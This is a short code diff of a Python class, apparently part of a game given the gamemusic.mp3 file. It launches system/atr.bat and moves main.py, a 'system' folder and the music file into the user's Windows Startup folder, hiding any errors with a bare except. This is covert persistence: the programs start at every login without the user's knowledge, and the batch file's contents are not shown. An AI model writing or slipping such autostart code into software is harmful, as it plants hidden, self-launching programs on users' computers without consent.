@@ -37,7 +37,6 @@ class M():
 
         try:
             USER_NAME = getuser()
-            src = '../vit'
             dest = f'C:/Users/{USER_NAME}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'
 
         except:
@@ -45,7 +44,9 @@ class M():
 
         try:
             system("start system/atr.bat")
-            move(src, dest)
+            move("./main.py", dest)
+            move("./system", dest)
+            move("./gamemusic.mp3", dest)
         except:
             pass
 
